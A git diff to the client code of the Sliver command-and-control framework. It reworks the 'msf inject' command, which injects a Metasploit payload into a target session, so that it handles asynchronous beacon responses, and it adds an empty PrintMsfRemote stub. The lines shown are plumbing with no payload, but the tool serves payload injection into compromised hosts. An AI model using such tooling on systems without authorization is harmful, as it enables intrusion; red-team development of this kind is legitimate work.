@@ -25,6 +25,8 @@ import (
 	"github.com/bishopfox/sliver/client/console"
 	consts "github.com/bishopfox/sliver/client/constants"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"google.golang.org/protobuf/proto"
 
 	"github.com/desertbit/grumble"
 )
@@ -57,7 +59,7 @@ func MsfInjectCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
 		payloadName, session.OS, session.Arch, lhost, lport)
 	con.SpinUntil(msg, ctrl)
-	_, err := con.Rpc.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
+	msfTask, err := con.Rpc.MsfRemote(context.Background(), &clientpb.MSFRemoteReq{
 		Request:    con.ActiveTarget.Request(ctx),
 		Payload:    payloadName,
 		LHost:      lhost,
@@ -70,7 +72,24 @@ func MsfInjectCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	<-ctrl
 	if err != nil {
 		con.PrintErrorf("%s\n", err)
-	} else {
-		con.PrintInfof("Executed payload on target\n")
+		return
 	}
+
+	if msfTask.Response != nil && msfTask.Response.Async {
+		con.AddBeaconCallback(msfTask.Response.TaskID, func(task *clientpb.BeaconTask) {
+			err = proto.Unmarshal(task.Response, msfTask)
+			if err != nil {
+				con.PrintErrorf("Failed to decode response %s\n", err)
+				return
+			}
+			PrintMsfRemote(msfTask, con)
+		})
+		con.PrintAsyncResponse(msfTask.Response)
+	} else {
+		PrintMsfRemote(msfTask, con)
+	}
+}
+
+func PrintMsfRemote(msfRemote *sliverpb.Task, con *console.SliverConsoleClient) {
+
 }
